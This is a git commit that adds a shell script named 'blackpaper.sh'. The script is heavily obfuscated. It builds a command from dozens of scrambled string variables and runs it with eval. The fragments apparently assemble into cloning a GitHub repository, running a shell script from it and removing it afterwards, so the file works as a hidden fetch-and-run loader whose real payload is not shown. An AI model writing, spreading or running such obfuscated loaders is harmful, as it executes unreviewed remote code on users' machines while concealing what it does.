9cd40bdfceffaafabe6b447f9f6f72433ca0cd2d
The Black Paper <52263806+7870a@users.noreply.github.com>
2020-11-21 10:20:05 +0700

    Add files via upload

---
+++ blackpaper.sh
@@ -0,0 +1,3 @@
+z="
+";hz='-'\'';L';tz='$Iz$';Gz=''\'';Dz';iz='z='\''c';bz=''\''e h';az=';Ez=';qz='$Ez$';cz='t'\'';J';Fz='thub';Az='z="';sz='z$Hz';oz='$z$C';Lz=''\'';Cz';nz='z$Bz';Hz='='\''cl';Bz='";Mz';Dz=' p'\'';';ez='787'\''';pz='z$Dz';Qz=';Kz=';xz='$Mz$';rz='Fz$G';Ez='Hz='\''';Zz='f p'\''';dz='z='\''/';Uz='com'\''';fz=';Az=';Yz='z='\''r';yz='Nz"';Cz='='\''sh';Wz=''\''tps';Oz='Nz='\''';Xz=':'\'';B';wz='Lz$z';Kz='//gi';Iz='on'\'';';mz=' "$A';gz=''\''rm ';lz='eval';Jz='Gz='\''';Tz='z='\''.';Nz='t '\'';';kz=';';uz='Jz$K';Vz=';Fz=';vz='z$z$';Sz='p'\'';I';Rz=''\''0a/';Mz='='\''gi';Pz='.sh'\''';jz='d p'\''';
+eval "$Az$z$Bz$Cz$Dz$Ez$Fz$Gz$Hz$Iz$Jz$Kz$Lz$Mz$Nz$Oz$Pz$Qz$Rz$Sz$Tz$Uz$Vz$Wz$Xz$Yz$Zz$az$bz$cz$dz$ez$fz$gz$hz$iz$jz$kz$z$lz$mz$nz$oz$pz$qz$rz$sz$tz$uz$vz$wz$xz$yz"
